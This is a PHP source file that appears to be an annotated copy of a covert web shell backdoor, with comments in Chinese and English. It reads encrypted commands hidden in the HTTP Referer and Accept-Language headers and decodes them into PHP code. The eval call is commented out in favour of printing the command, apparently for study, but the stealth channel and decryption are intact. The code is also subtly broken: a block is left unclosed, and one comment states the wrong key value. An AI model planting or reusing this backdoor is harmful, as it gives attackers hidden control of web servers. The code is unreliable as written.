<?php
$kh = "42f7";

$kf = "e9ac";

// 循环异或加密解密，密钥 $k
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}
$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra){
    // 将 referer 的 query string 的 各个 value 取出到 $q
    $u=parse_url($rr); // parse referer, return array, keys: scheme,host,port,user,pass,path,query,fragment
    parse_str($u["query"],$q); // parse query string into $q (array).
    $q=array_values($q);        // array values 

    // 分析 Accept-Language，提取 每种语言的首字母和权重数字。
    // Searches $ra for all matches to the regular expression given and puts them in $m
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
    if($q&&$m){
        @session_start();
        $s=&$_SESSION;
        $ss="substr";
        $sl="strtolower";
        $i=$m[1][0].$m[1][1];              // 两组首字母
        $h=$sl($ss(md5($i.$kh),0,3)); // md5($i . $kh) 的前三个字符小写。攻击时附在 $p 开头
        $f=$sl($ss(md5($i.$kf),0,3)); // $p 是编码后 Payload，攻击时附加到 $p 后面

        // 拼接 Payload
        $p="";
        for($z=1;$z<count($m[1]);$z++)  // 从 $q 中取出 $m 正则匹配到的第 2 组中索引 1 -- count($m[1])-1 的值 (0-9) 作为键的值连接，得到 $p
            $p.=$q[$m[2][$z]];         // 上例（language）, $p .= $q[8]


        // 去除 $p Payload 开头的 $h
        if(strpos($p,$h)===0){        // $h 在 $p[0] 位置出现。
            $s[$i]="";        // $_SESSION[$i] = '', $i 是正则匹配到的两组首字母
            $p=$ss($p,3);    // $p 从第 3 个字符开始的子串，去掉 $h
        }
        if(array_key_exists($i,$s)){         // exist $s[$i], $_SESSION[$i] , if 条件必须有 上文 $h 在 $p[0] 位置出现
            $s[$i].=$p;
            $e=strpos($s[$i],$f);   // $f 是 md5 前三个字符小写，在 $s[$i]
            if($e){    // 必须有 $f 作为“停止字符串”
                $k=$kh.$kf; // 4f7f28d7
                ob_start();
                /*
                去除末尾的 $f
                URL safe base64 还原为普通 base64
                base64 解码
                循环异或解密
                zlib 解码，还原出 PHP 代码
                执行 PHP 代码
                */
                //@eval(@gzuncompress(@x(@base64_decode( preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e)) ),$k)));
                echo "CMD WILL EXEC:\n<br />";
                echo(@gzuncompress(@x(@base64_decode( preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e)) ),$k)));
                $o=ob_get_contents();  // output
                ob_end_clean();
                $d=base64_encode(x(gzcompress($o),$k));  // 编码
                print $o;
                //print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
?>